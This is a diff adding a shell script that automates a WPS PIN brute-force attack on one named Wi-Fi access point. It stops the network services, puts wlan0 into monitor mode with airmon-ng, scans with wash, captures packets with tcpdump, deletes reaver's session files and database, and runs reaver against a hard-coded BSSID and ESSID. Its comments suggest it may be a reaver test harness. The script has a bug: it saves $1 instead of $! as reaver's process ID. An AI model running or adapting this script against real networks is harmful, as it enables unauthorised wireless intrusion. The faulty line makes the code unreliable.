@@ -1,0 +1,35 @@
+#!/bin/sh
+export BSSID=64:70:02:a0:d5:17
+export ESSID="Jeff Winger's Wireless Hairdryer"
+export CHAN=6
+
+service network-manager stop
+sleep 2
+ifconfig wlan0 down
+sleep 2
+killall wpa_supplicant
+sleep 2
+
+airmon-ng start wlan0 ${CHAN}
+sleep 5
+
+wash -i mon0 -c ${CHAN} -o wash_log.txt &
+WASH_PID=$!
+sleep 20
+/bin/kill -SIGINT $WASH_PID
+
+tcpdump -i mon0 -s0 -w reaver_dump.pcap &
+TCPDUMP_PID=$!
+
+# Reaver could use a non-interactive --resume-session/--discard-session flag...
+rm ./*.wpc
+rm /etc/reaver/reaver.db
+rm /etc/reaver/*.wpc
+
+reaver -i mon0 -e "${ESSID}" -b ${BSSID} -c ${CHAN} -vv -S -o reaver_log.txt &
+REAVER_PID=$1
+sleep 60
+# ...and an alternative to -g that counts unsuccessful attempts.
+/bin/kill -SIGKILL $REAVER_PID
+
+/bin/kill -SIGINT $TCPDUMP_PID
